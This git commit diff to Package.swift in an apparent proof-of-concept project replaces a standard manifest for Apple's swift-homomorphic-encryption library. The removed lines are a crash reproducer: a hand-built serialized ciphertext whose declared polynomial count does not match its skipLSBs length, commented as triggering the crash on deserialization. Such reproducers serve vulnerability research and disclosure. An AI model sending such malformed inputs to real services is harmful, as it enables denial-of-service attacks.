67c567d8f16a9816c7fca0e8e3f765aa66635c21
Salman <0daytrace@gmail.com>
2026-09-05 09:21:04 +0100

    Update Package.swift

--- Package.swift
+++ Package.swift
@@ -1,27 +1,18 @@
-import Foundation
-import HomomorphicEncryption
+// swift-tools-version: 6.3
+import PackageDescription
 
-do {
-    // Explicitly declare the type to give the compiler the context it needs
-    let params: EncryptionParameters<UInt64> = try .init(from: .insecure_N_16_logQ_5_5)
-    
-    // Context is generic over the Scheme (e.g., Bfv<UInt64>)
-    let context = try Context<Bfv<UInt64>>(encryptionParameters: params)
-
-    // polyCount = 2 (Little Endian: 0x02, 0x00)
-    let fakePolysBuffer: [UInt8] = [0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
-    
-    let maliciousSerialized = SerializedCiphertext<UInt64>.full(
-        polys: fakePolysBuffer, 
-        skipLSBs: [0], // Length is 1, but polyCount is 2. This triggers the crash.
-        correctionFactor: 1
-    )
-
-    let _ = try Ciphertext<Bfv<UInt64>, Coeff>(
-        deserialize: maliciousSerialized, 
-        context: context
-    )
-    print("Unexpectedly succeeded")
-} catch {
-    print("Caught error: \(error)")
-}
+let package = Package(
+    name: "HE_PoC",
+    platforms: [.macOS(.v14)],
+    dependencies: [
+        .package(url: "https://github.com/apple/swift-homomorphic-encryption", branch: "main")
+    ],
+    targets: [
+        .executableTarget(
+            name: "HE_PoC",
+            dependencies: [
+                .product(name: "HomomorphicEncryption", package: "swift-homomorphic-encryption")
+            ]
+        )
+    ]
+)
